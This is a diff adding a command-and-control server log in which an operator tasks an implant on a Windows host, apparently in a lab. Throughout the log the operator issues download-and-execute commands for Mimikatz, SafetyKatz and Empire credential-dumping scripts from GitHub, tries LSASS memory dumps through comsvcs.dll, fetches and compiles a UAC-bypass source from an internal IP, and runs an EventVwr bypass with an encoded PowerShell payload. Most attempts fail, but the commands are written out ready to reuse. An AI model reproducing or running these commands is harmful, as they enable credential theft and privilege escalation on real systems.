@@ -1,0 +1,857 @@
+[2019-11-11T20:22:28Z]Instantiated agent
+[2019-11-11T20:22:28Z]Received agent OPAQUE register initialization message
+[2019-11-11T20:22:30Z]OPAQUE registration complete
+[2019-11-11T20:22:33Z]Received new agent OPAQUE authentication initialization message
+[2019-11-11T20:22:36Z]Received agent OPAQUE authentication complete message
+[2019-11-11T20:22:38Z]Processing AgentInfo message:
+[2019-11-11T20:22:38Z]	Agent Version: 0.8.0.BETA 
+[2019-11-11T20:22:38Z]	Agent Build: d6843753ac27a02997150a7b79fd9cdc9c61cf61 
+[2019-11-11T20:22:38Z]	Agent waitTime: 30s 
+[2019-11-11T20:22:38Z]	Agent skew: 3000 
+[2019-11-11T20:22:38Z]	Agent paddingMax: 4096 
+[2019-11-11T20:22:38Z]	Agent maxRetry: 7 
+[2019-11-11T20:22:38Z]	Agent failedCheckin: 0 
+[2019-11-11T20:22:38Z]	Agent proto: h2 
+[2019-11-11T20:22:38Z]	Agent KillDate: 1970-01-01T00:00:00Z
+[2019-11-11T20:23:17Z]Agent status check in
+[2019-11-11T20:23:49Z]Agent status check in
+[2019-11-11T20:24:19Z]Agent status check in
+[2019-11-11T20:24:41Z]Created job Type:cmd, ID:SvEysLRIPQ, Status:created, Args:[ps]
+[2019-11-11T20:24:51Z]Agent status check in
+[2019-11-11T20:24:53Z]Results for job: SvEysLRIPQ
+[2019-11-11T20:24:53Z]Command Results (stderr):
+exec: "ps": executable file not found in %PATH%
+[2019-11-11T20:25:12Z]Created job Type:cmd, ID:DcQZIdWIwI, Status:created, Args:[powershell.exe get-process]
+[2019-11-11T20:25:23Z]Agent status check in
+[2019-11-11T20:25:26Z]Results for job: DcQZIdWIwI
+[2019-11-11T20:25:26Z]Command Results (stdout):
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+-------  ------    -----      -----     ------     --  -- -----------                                                  
+    214      14     4492      10192       0.38   2996   1 ApplicationFrameHost                                         
+     40       3     1584       2780       0.00   6088   1 cmd                                                          
+    178      11     5708      16132       0.50    888   1 conhost                                                      
+    104      10     2916       8384       0.05   5328   1 conhost                                                      
+    253      12     1348       1924               376   0 csrss                                                        
+    216      17     1648       2356               460   1 csrss                                                        
+    218      13     3764       4520              2492   0 dllhost                                                      
+    134       9     1824       9584       0.06   5904   1 dllhost                                                      
+    284      23    73328      91244               844   1 dwm                                                          
+   1596      66    26208      59560       7.08   3080   1 explorer                                                     
+    164      12     2104       9380              2276   0 GoogleUpdate                                                 
+      0       0        0          4                 0   0 Idle                                                         
+    921      21     4956       8256               588   0 lsass                                                        
+      0       0       88       8532              2024   0 Memory Compression                                           
+    143       9     2088       7284              2796   0 MpCmdRun                                                     
+    222      14     3416       4680       0.36   4132   1 MSASCuiL                                                     
+    187      12     2776       2620              2724   0 msdtc                                                        
+    629      69   199268     191476              1216   0 MsMpEng                                                      
+    182      14     5096       5316              2916   0 NisSrv                                                       
+    663      56    23824      23268       2.22   4328   1 OneDrive                                                     
+    478      26    48100      50884       0.39   4440   1 powershell                                                   
+    657      26    79880      87100       0.91   5476   1 powershell                                                   
+    123      10    17700      15040      14.80   6140   1 reaperAgent-Windows-x64                                      
+    403      21     7636      19304       0.70   2816   1 RuntimeBroker                                                
+    568      35    20744      17616              3504   0 SearchIndexer                                                
+    828      60    60156      92540       2.42   3660   1 SearchUI                                                     
+    262       9     2916       4852               548   0 services                                                     
+    771      35    20840      39388       1.33   3448   1 ShellExperienceHost                                          
+    387      15     4280      11900       0.63    756   1 sihost                                                       
+     51       2      356        408               288   0 smss                                                         
+    484      28     8948       7276              1500   0 spoolsv                                                      
+    516      40    13980      16576               464   0 svchost                                                      
+    636      21     6168      11536               680   0 svchost                                                      
+    624      16     4504       6812               744   0 svchost                                                      
+   2104     100    34672      50684               876   0 svchost                                                      
+    311      18     4528       8872       0.30    900   1 svchost                                                      
+    551      21    11984      13512               904   0 svchost                                                      
+    585      30    11276      11028               936   0 svchost                                                      
+    912      33     9744      14332              1028   0 svchost                                                      
+    878     268    16432      23004              1176   0 svchost                                                      
+    206      11     2144       5532              1272   0 svchost                                                      
+    179      12     2168       3088              1336   0 svchost                                                      
+    233      18     5192      11464              1872   0 svchost                                                      
+    475      24     7020      13656              1912   0 svchost                                                      
+    188      14     1916       3492              3216   0 svchost                                                      
+    983       0      128         32                 4   0 System                                                       
+    379      34     6252      12132       0.36   1056   1 taskhostw                                                    
+    392      23    12176      33732       8.03   5612   1 Taskmgr                                                      
+   9510      20   529524     480296              5660   0 TiWorker                                                     
+    117       8     2052       4180              5216   0 TrustedInstaller                                             
+    149      12     5420       3900              1900   0 VGAuthService                                                
+     95       7     1336       1284              1044   0 vmacthlp                                                     
+    351      24     9556      11080              1892   0 vmtoolsd                                                     
+    482      29    14316      14704       5.56   4188   1 vmtoolsd                                                     
+     89       8     1032       1088               448   0 wininit                                                      
+    189       8     1960       3260               540   1 winlogon                                                     
+    312      16    10204      14908              2600   0 WmiPrvSE                                                     
+
+
+
+[2019-11-11T20:25:55Z]Agent status check in
+[2019-11-11T20:26:25Z]Agent status check in
+[2019-11-11T20:26:46Z]Created job Type:cmd, ID:gVvesfooSE, Status:created, Args:[powershell.exe -nop -w 0 "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Get-OSTokenInformation.ps1')"; Get-OSTokenInformation]
+[2019-11-11T20:26:55Z]Agent status check in
+[2019-11-11T20:26:58Z]Results for job: gVvesfooSE
+[2019-11-11T20:26:58Z]Command Results (stderr):
+fork/exec C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe: Access is denied.
+[2019-11-11T20:27:28Z]Agent status check in
+[2019-11-11T20:27:58Z]Agent status check in
+[2019-11-11T20:28:29Z]Agent status check in
+[2019-11-11T20:29:01Z]Agent status check in
+[2019-11-11T20:29:32Z]Agent status check in
+[2019-11-11T20:30:05Z]Agent status check in
+[2019-11-11T20:30:37Z]Agent status check in
+[2019-11-11T20:31:10Z]Agent status check in
+[2019-11-11T20:31:41Z]Agent status check in
+[2019-11-11T20:32:12Z]Agent status check in
+[2019-11-11T20:32:21Z]Created job Type:cmd, ID:eogSwMQRsq, Status:created, Args:[powershell.exe -nop -w 1 " (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/GhostPack/SafetyKatz/master/SafetyKatz/Program.cs', $env:APPDATA+'\\SafetyKatz.cs'); (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/GhostPack/SafetyKatz/master/SafetyKatz/Constants.cs', $env:APPDATA+'\\Constants.cs'); c:\\Windows\\Microsoft.NET\\Framework64\\v4.*\\csc.exe /unsafe /out:$env:APPDATA\\SafetyKatz.exe $env:APPDATA\\SafetyKatz.cs $env:APPDATA\\Constants.cs; &$env:APPDATA\\SafetyKatz.exe ;del $env:APPDATA\\SafetyKatz.* ;del $env:APPDATA\\Constants.* "]
+[2019-11-11T20:32:44Z]Agent status check in
+[2019-11-11T20:32:47Z]Results for job: eogSwMQRsq
+[2019-11-11T20:32:47Z]Command Results (stdout):
+Exception calling "DownloadFile" with "2" argument(s): "The remote name could not be resolved: 
+'raw.githubusercontent.com'"
+At line:1 char:2
++  (New-Object System.Net.WebClient).DownloadFile('https://raw.githubus ...
++  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+ 
+Exception calling "DownloadFile" with "2" argument(s): "The remote name could not be resolved: 
+'raw.githubusercontent.com'"
+At line:1 char:168
++ ... yKatz.cs'); (New-Object System.Net.WebClient).DownloadFile('https://r ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+ 
+Microsoft (R) Visual C# Compiler version 4.7.2053.0
+for C# 5
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
+
+error CS2001: Source file 'C:\Users\toc\AppData\Roaming\SafetyKatz.cs' could not be found
+error CS2001: Source file 'C:\Users\toc\AppData\Roaming\Constants.cs' could not be found
+warning CS2008: No source files specified
+& : The term 'C:\Users\toc\AppData\Roaming\SafetyKatz.exe' is not recognized as the name of a cmdlet, function, script 
+file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct 
+and try again.
+At line:1 char:481
++ ... tz.cs $env:APPDATA\Constants.cs; &$env:APPDATA\SafetyKatz.exe ;del $e ...
++                                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\toc\Ap...\SafetyKatz.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+
+[2019-11-11T20:33:14Z]Agent status check in
+[2019-11-11T20:33:46Z]Agent status check in
+[2019-11-11T20:34:10Z]Created job Type:cmd, ID:QcJunmMnSC, Status:created, Args:[powershell.exe -nop -w 1 " (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/GhostPack/SafetyKatz/master/SafetyKatz/Program.cs', $env:APPDATA+'\\SafetyKatz.cs'); (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/GhostPack/SafetyKatz/master/SafetyKatz/Constants.cs', $env:APPDATA+'\\Constants.cs'); c:\\Windows\\Microsoft.NET\\Framework64\\v3.0\\csc.exe /unsafe /out:$env:APPDATA\\SafetyKatz.exe $env:APPDATA\\SafetyKatz.cs $env:APPDATA\\Constants.cs; &$env:APPDATA\\SafetyKatz.exe ;del $env:APPDATA\\SafetyKatz.* ;del $env:APPDATA\\Constants.* "]
+[2019-11-11T20:34:17Z]Agent status check in
+[2019-11-11T20:34:43Z]Results for job: QcJunmMnSC
+[2019-11-11T20:34:43Z]Command Results (stdout):
+Exception calling "DownloadFile" with "2" argument(s): "The remote name could not be resolved: 
+'raw.githubusercontent.com'"
+At line:1 char:2
++  (New-Object System.Net.WebClient).DownloadFile('https://raw.githubus ...
++  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+ 
+Exception calling "DownloadFile" with "2" argument(s): "The remote name could not be resolved: 
+'raw.githubusercontent.com'"
+At line:1 char:168
++ ... yKatz.cs'); (New-Object System.Net.WebClient).DownloadFile('https://r ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+ 
+c:\Windows\Microsoft.NET\Framework64\v3.0\csc.exe : The term 'c:\Windows\Microsoft.NET\Framework64\v3.0\csc.exe' is 
+not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or 
+if a path was included, verify that the path is correct and try again.
+At line:1 char:335
++ ... tants.cs'); c:\Windows\Microsoft.NET\Framework64\v3.0\csc.exe /unsafe ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (c:\Windows\Micr...64\v3.0\csc.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+& : The term 'C:\Users\toc\AppData\Roaming\SafetyKatz.exe' is not recognized as the name of a cmdlet, function, script 
+file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct 
+and try again.
+At line:1 char:481
++ ... tz.cs $env:APPDATA\Constants.cs; &$env:APPDATA\SafetyKatz.exe ;del $e ...
++                                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\toc\Ap...\SafetyKatz.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+
+[2019-11-11T20:34:47Z]Agent status check in
+[2019-11-11T20:35:16Z]Created job Type:cmd, ID:IxilrSUghE, Status:created, Args:[powershell.exe -nop -w 0 "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/dumpCredStore.ps1')"]
+[2019-11-11T20:35:18Z]Agent status check in
+[2019-11-11T20:35:20Z]Results for job: IxilrSUghE
+[2019-11-11T20:35:20Z]Command Results (stderr):
+fork/exec C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe: Access is denied.
+[2019-11-11T20:35:51Z]Agent status check in
+[2019-11-11T20:36:23Z]Agent status check in
+[2019-11-11T20:36:28Z]Created job Type:cmd, ID:bybApnedaE, Status:created, Args:[powershell.exe -nop -w 0 "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds "]
+[2019-11-11T20:36:53Z]Agent status check in
+[2019-11-11T20:36:55Z]Results for job: bybApnedaE
+[2019-11-11T20:36:55Z]Command Results (stderr):
+fork/exec C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe: Access is denied.
+[2019-11-11T20:37:26Z]Agent status check in
+[2019-11-11T20:37:58Z]Agent status check in
+[2019-11-11T20:38:30Z]Agent status check in
+[2019-11-11T20:39:03Z]Agent status check in
+[2019-11-11T20:39:34Z]Agent status check in
+[2019-11-11T20:40:07Z]Agent status check in
+[2019-11-11T20:40:32Z]Created job Type:Minidump, ID:XXmznNWDJe, Status:created, Args:[lsass.exe 0 ]
+[2019-11-11T20:40:38Z]Agent status check in
+[2019-11-11T20:40:40Z]Results for job: XXmznNWDJe
+[2019-11-11T20:40:40Z]Command Results (stderr):
+There was an error executing the miniDump module:
+Access is denied.
+[2019-11-11T20:41:09Z]Agent status check in
+[2019-11-11T20:41:31Z]Created job Type:cmd, ID:TBLSnkjJPd, Status:created, Args:[powershell.exe -nop -w 0 "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1'); [MyProcess]::CreateProcessFromParent(376,'cmd.exe') "]
+[2019-11-11T20:41:40Z]Agent status check in
+[2019-11-11T20:41:42Z]Results for job: TBLSnkjJPd
+[2019-11-11T20:41:42Z]Command Results (stderr):
+fork/exec C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe: Access is denied.
+[2019-11-11T20:42:11Z]Agent status check in
+[2019-11-11T20:42:43Z]Agent status check in
+[2019-11-11T20:43:14Z]Agent status check in
+[2019-11-11T20:43:44Z]Agent status check in
+[2019-11-11T20:44:17Z]Agent status check in
+[2019-11-11T20:44:50Z]Agent status check in
+[2019-11-11T20:45:22Z]Agent status check in
+[2019-11-11T20:45:54Z]Agent status check in
+[2019-11-11T20:46:26Z]Agent status check in
+[2019-11-11T20:46:57Z]Agent status check in
+[2019-11-11T20:47:29Z]Agent status check in
+[2019-11-11T20:47:59Z]Agent status check in
+[2019-11-11T20:48:32Z]Agent status check in
+[2019-11-11T20:49:03Z]Agent status check in
+[2019-11-11T20:49:33Z]Agent status check in
+[2019-11-11T20:49:53Z]Created job Type:cmd, ID:ZrrgyKFJxW, Status:created, Args:[sc create test binpath="rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of lsass.exe] dump.bin full"]
+[2019-11-11T20:50:03Z]Created job Type:cmd, ID:MNYQLqScRC, Status:created, Args:[sc privs test SeDebugPrivilege]
+[2019-11-11T20:50:04Z]Agent status check in
+[2019-11-11T20:50:06Z]Results for job: ZrrgyKFJxW
+[2019-11-11T20:50:06Z]Command Results (stdout):
+[SC] OpenSCManager FAILED 5:
+
+Access is denied.
+
+
+[2019-11-11T20:50:06Z]Command Results (stderr):
+exit status 5
+[2019-11-11T20:50:36Z]Agent status check in
+[2019-11-11T20:50:38Z]Results for job: MNYQLqScRC
+[2019-11-11T20:50:38Z]Command Results (stdout):
+[SC] OpenService FAILED 1060:
+
+The specified service does not exist as an installed service.
+
+
+[2019-11-11T20:50:38Z]Command Results (stderr):
+exit status 1060
+[2019-11-11T20:50:50Z]Created job Type:cmd, ID:EqHxNZdXzu, Status:created, Args:[sc create test binpath="rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump dump.bin full"]
+[2019-11-11T20:50:57Z]Created job Type:cmd, ID:ZVjSQqeBHV, Status:created, Args:[sc create test binpath="rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 588 dump.bin full"]
+[2019-11-11T20:51:07Z]Agent status check in
+[2019-11-11T20:51:09Z]Results for job: EqHxNZdXzu
+[2019-11-11T20:51:09Z]Command Results (stdout):
+[SC] OpenSCManager FAILED 5:
+
+Access is denied.
+
+
+[2019-11-11T20:51:09Z]Command Results (stderr):
+exit status 5
+[2019-11-11T20:51:22Z]Created job Type:cmd, ID:UQNUsXWbNb, Status:created, Args:[sc privs test SeDebugPrivilege]
+[2019-11-11T20:51:39Z]Agent status check in
+[2019-11-11T20:51:40Z]Results for job: ZVjSQqeBHV
+[2019-11-11T20:51:40Z]Command Results (stdout):
+[SC] OpenSCManager FAILED 5:
+
+Access is denied.
+
+
+[2019-11-11T20:51:40Z]Command Results (stderr):
+exit status 5
+[2019-11-11T20:52:09Z]Agent status check in
+[2019-11-11T20:52:11Z]Results for job: UQNUsXWbNb
+[2019-11-11T20:52:11Z]Command Results (stdout):
+[SC] OpenService FAILED 1060:
+
+The specified service does not exist as an installed service.
+
+
+[2019-11-11T20:52:11Z]Command Results (stderr):
+exit status 1060
+[2019-11-11T20:52:39Z]Agent status check in
+[2019-11-11T20:53:10Z]Agent status check in
+[2019-11-11T20:53:42Z]Agent status check in
+[2019-11-11T20:54:12Z]Agent status check in
+[2019-11-11T20:54:43Z]Agent status check in
+[2019-11-11T20:55:02Z]Created job Type:cmd, ID:NJbyCaspmr, Status:created, Args:[powershell.exe -nop -w 1 " (New-Object System.Net.WebClient).DownloadFile('http://172.16.254.1:8080/WinNT.cs', $env:APPDATA+'\\uac.cs'); c:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\csc.exe /unsafe /out:$env:APPDATA\\uac.exe $env:APPDATA\\uac.cs; &$env:APPDATA\\uac.exe {{ProcessID.Value}} ;del $env:APPDATA\\uac.cs "]
+[2019-11-11T20:55:16Z]Agent status check in
+[2019-11-11T20:55:19Z]Results for job: NJbyCaspmr
+[2019-11-11T20:55:19Z]Command Results (stdout):
+c:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe : The term 'c:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe' is 
+not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or 
+if a path was included, verify that the path is correct and try again.
+At line:1 char:111
++ ... '\uac.cs'); c:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /unsafe ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (c:\Windows\Micr...64\v3.5\csc.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+& : The term 'C:\Users\toc\AppData\Roaming\uac.exe' is not recognized as the name of a cmdlet, function, script file, 
+or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and 
+try again.
+At line:1 char:217
++ ... nv:APPDATA\uac.exe $env:APPDATA\uac.cs; &$env:APPDATA\uac.exe {{Proce ...
++                                              ~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\toc\AppData\Roaming\uac.exe:String) [], CommandNotFoundExcepti 
+   on
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+
+[2019-11-11T20:55:35Z]Created job Type:cmd, ID:YTfBKdQqmt, Status:created, Args:[powershell.exe -nop -w 1 " (New-Object System.Net.WebClient).DownloadFile('http://172.16.254.1:8080/WinNT.cs', $env:APPDATA+'\\uac.cs'); c:\\Windows\\Microsoft.NET\\Framework64\\v4.*\\csc.exe /unsafe /out:$env:APPDATA\\uac.exe $env:APPDATA\\uac.cs; &$env:APPDATA\\uac.exe {{ProcessID.Value}} ;del $env:APPDATA\\uac.cs "]
+[2019-11-11T20:55:48Z]Agent status check in
+[2019-11-11T20:55:50Z]Results for job: YTfBKdQqmt
+[2019-11-11T20:55:50Z]Command Results (stdout):
+Microsoft (R) Visual C# Compiler version 4.7.2053.0
+for C# 5
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
+
+c:\Users\toc\AppData\Roaming\uac.cs(233,55): error CS1002: ; expected
+c:\Users\toc\AppData\Roaming\uac.cs(233,65): error CS1519: Invalid token '>=' in class, struct, or interface member declaration
+c:\Users\toc\AppData\Roaming\uac.cs(233,85): error CS1519: Invalid token '&&' in class, struct, or interface member declaration
+c:\Users\toc\AppData\Roaming\uac.cs(233,119): error CS1003: Syntax error, '>' expected
+c:\Users\toc\AppData\Roaming\uac.cs(233,119): error CS1519: Invalid token ';' in class, struct, or interface member declaration
+& : The term 'C:\Users\toc\AppData\Roaming\uac.exe' is not recognized as the name of a cmdlet, function, script file, 
+or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and 
+try again.
+At line:1 char:217
++ ... nv:APPDATA\uac.exe $env:APPDATA\uac.cs; &$env:APPDATA\uac.exe {{Proce ...
++                                              ~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\toc\AppData\Roaming\uac.exe:String) [], CommandNotFoundExcepti 
+   on
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+
+[2019-11-11T20:56:19Z]Agent status check in
+[2019-11-11T20:56:52Z]Agent status check in
+[2019-11-11T20:57:25Z]Agent status check in
+[2019-11-11T20:57:56Z]Agent status check in
+[2019-11-11T20:58:26Z]Agent status check in
+[2019-11-11T20:58:58Z]Agent status check in
+[2019-11-11T20:59:30Z]Agent status check in
+[2019-11-11T21:00:01Z]Agent status check in
+[2019-11-11T21:00:19Z]Created job Type:ls, ID:dSweLBrdBw, Status:created, Args:[ls]
+[2019-11-11T21:00:33Z]Agent status check in
+[2019-11-11T21:00:35Z]Results for job: dSweLBrdBw
+[2019-11-11T21:00:35Z]Command Results (stdout):
+Directory listing for: C:\Users\toc\Desktop
+
+-rw-rw-rw-	2017-12-09 19:07:52	3758	Invoke-EventVwrBypass.ps1
+-rw-rw-rw-	2019-10-18 09:45:13	282	desktop.ini
+-rw-rw-rw-	2019-11-11 13:29:25	9268224	reaperAgent-Windows-x64.exe
+
+[2019-11-11T21:00:58Z]Created job Type:cmd, ID:AAyzrEGplL, Status:created, Args:[powershell.exe -c './Invoke-EventVwrBypass.ps1']
+[2019-11-11T21:01:04Z]Agent status check in
+[2019-11-11T21:01:07Z]Results for job: AAyzrEGplL
+[2019-11-11T21:01:07Z]Command Results (stdout):
+./Invoke-EventVwrBypass.ps1 : File C:\Users\toc\Desktop\Invoke-EventVwrBypass.ps1 cannot be loaded because running 
+scripts is disabled on this system. For more information, see about_Execution_Policies at 
+http://go.microsoft.com/fwlink/?LinkID=135170.
+At line:1 char:1
++ ./Invoke-EventVwrBypass.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+
+[2019-11-11T21:01:07Z]Command Results (stderr):
+exit status 1
+[2019-11-11T21:01:35Z]Agent status check in
+[2019-11-11T21:02:06Z]Agent status check in
+[2019-11-11T21:02:38Z]Agent status check in
+[2019-11-11T21:03:10Z]Agent status check in
+[2019-11-11T21:03:42Z]Agent status check in
+[2019-11-11T21:04:12Z]Agent status check in
+[2019-11-11T21:04:44Z]Agent status check in
+[2019-11-11T21:05:16Z]Agent status check in
+[2019-11-11T21:05:47Z]Agent status check in
+[2019-11-11T21:06:18Z]Agent status check in
+[2019-11-11T21:06:51Z]Agent status check in
+[2019-11-11T21:07:04Z]Created job Type:cmd, ID:DrRmTqIoic, Status:created, Args:[import-module ./Invoke-EventVwrBypass]
+[2019-11-11T21:07:21Z]Agent status check in
+[2019-11-11T21:07:23Z]Results for job: DrRmTqIoic
+[2019-11-11T21:07:23Z]Command Results (stderr):
+exec: "import-module": executable file not found in %PATH%
+[2019-11-11T21:07:52Z]Agent status check in
+[2019-11-11T21:08:23Z]Agent status check in
+[2019-11-11T21:08:55Z]Agent status check in
+[2019-11-11T21:09:03Z]Created job Type:cmd, ID:pOuoHWYOIV, Status:created, Args:[Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="]
+[2019-11-11T21:09:09Z]Created job Type:cmd, ID:OfvUVTeWHE, Status:created, Args:[./Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="]
+[2019-11-11T21:09:25Z]Agent status check in
+[2019-11-11T21:09:27Z]Results for job: pOuoHWYOIV
+[2019-11-11T21:09:27Z]Command Results (stderr):
+exec: "Invoke-EventVwrBypass": executable file not found in %PATH%
+[2019-11-11T21:09:35Z]Created job Type:ls, ID:tQMQkJJAEZ, Status:created, Args:[ls]
+[2019-11-11T21:09:57Z]Agent status check in
+[2019-11-11T21:09:59Z]Results for job: OfvUVTeWHE
+[2019-11-11T21:09:59Z]Command Results (stderr):
+exec: "./Invoke-EventVwrBypass": file does not exist
+[2019-11-11T21:10:28Z]Agent status check in
+[2019-11-11T21:10:30Z]Results for job: tQMQkJJAEZ
+[2019-11-11T21:10:30Z]Command Results (stdout):
+Directory listing for: C:\Users\toc\Desktop
+
+-rw-rw-rw-	2017-12-09 19:07:52	3758	Invoke-EventVwrBypass.ps1
+-rw-rw-rw-	2019-10-18 09:45:13	282	desktop.ini
+-rw-rw-rw-	2019-11-11 13:29:25	9268224	reaperAgent-Windows-x64.exe
+
+[2019-11-11T21:10:59Z]Agent status check in
+[2019-11-11T21:11:30Z]Agent status check in
+[2019-11-11T21:12:01Z]Agent status check in
+[2019-11-11T21:12:32Z]Agent status check in
+[2019-11-11T21:13:03Z]Agent status check in
+[2019-11-11T21:13:36Z]Agent status check in
+[2019-11-11T21:14:09Z]Agent status check in
+[2019-11-11T21:14:40Z]Agent status check in
+[2019-11-11T21:15:13Z]Agent status check in
+[2019-11-11T21:15:44Z]Agent status check in
+[2019-11-11T21:16:17Z]Agent status check in
+[2019-11-11T21:16:47Z]Agent status check in
+[2019-11-11T21:17:18Z]Agent status check in
+[2019-11-11T21:17:50Z]Agent status check in
+[2019-11-11T21:18:21Z]Agent status check in
+[2019-11-11T21:18:53Z]Agent status check in
+[2019-11-11T21:19:26Z]Agent status check in
+[2019-11-11T21:19:58Z]Agent status check in
+[2019-11-11T21:20:30Z]Agent status check in
+[2019-11-11T21:21:01Z]Agent status check in
+[2019-11-11T21:21:31Z]Agent status check in
+[2019-11-11T21:22:03Z]Agent status check in
+[2019-11-11T21:22:36Z]Agent status check in
